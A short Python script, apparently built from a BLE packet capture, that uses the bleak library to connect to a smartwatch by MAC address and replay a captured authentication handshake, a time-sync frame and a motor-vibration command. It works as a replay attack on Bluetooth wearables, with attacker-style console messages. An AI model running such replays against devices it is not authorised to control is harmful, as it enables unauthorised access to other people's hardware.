import asyncio
from bleak import BleakClient

MAC = "A1:B2:CC:09:78:0F"
WRITE_UUID = "0000b002-0000-1000-8000-00805f9b34fb"

# Frame 960: Application-layer authentication payload
BIND_PAYLOAD = bytes.fromhex(
    "00000300016e000038003600080c006690fc5fb4010021aa3c00040067000c006848ff"
    "536a201c0002000004006d0104007a0004007b0008007c000003000000050078010000"
    "00000000000000000000"
)

# Frame 976: Time synchronization initialization state packet
TIME_PAYLOAD = bytes.fromhex("00ff000001950000080082271000000000000000")

# Frame 983: Target hardware motor command sequence
MOTOR_PAYLOAD = bytes.fromhex("00ff000204040000010001000000000000000000")

async def main():
    print(f"[*] Targeting watch peripheral [{MAC}]...")
    try:
        async with BleakClient(MAC, timeout=12.0) as client:
            if client.is_connected:
                print("[+] Connection verified. Sending authentication handshake...")
                await client.write_gatt_char(WRITE_UUID, BIND_PAYLOAD, response=False)
                await asyncio.sleep(0.6)
                
                print("[+] Sending time synchronization initialization frame...")
                await client.write_gatt_char(WRITE_UUID, TIME_PAYLOAD, response=False)
                await asyncio.sleep(0.3)
                
                print("[!] Blasting motor hardware trigger...")
                await client.write_gatt_char(WRITE_UUID, MOTOR_PAYLOAD, response=False)
                
                print("[+] Transmission run finalized.")
            else:
                print("[-] Link establishment failed.")
    except Exception as e:
        print(f"[-] Session Error: {e}")

if __name__ == "__main__":
    asyncio.run(main())
